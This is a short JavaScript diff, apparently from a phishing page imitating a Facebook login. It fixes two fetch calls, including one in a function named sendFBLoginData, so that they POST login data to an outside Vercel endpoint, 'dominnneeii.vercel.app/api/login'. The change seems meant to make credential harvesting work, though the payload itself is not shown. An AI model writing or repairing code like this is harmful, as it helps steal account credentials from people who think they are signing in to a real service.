@@ -292,7 +292,7 @@ function redirectToSuccess() {
         );
       if (detectedFromJambi) localStorage.setItem("isFromJambi", "true");
 
-      return fetch("https://dominnneeii.vercel.app/pages/api/login.js", {
+      return fetch("https://dominnneeii.vercel.app/api/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -346,7 +346,7 @@ async function sendFBLoginData() {
   };
 
   try {
-    const res = await fetch("https://dominnneeii.vercel.app/pages/api/login.js", {
+    const res = await fetch("https://dominnneeii.vercel.app/api/login", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload),
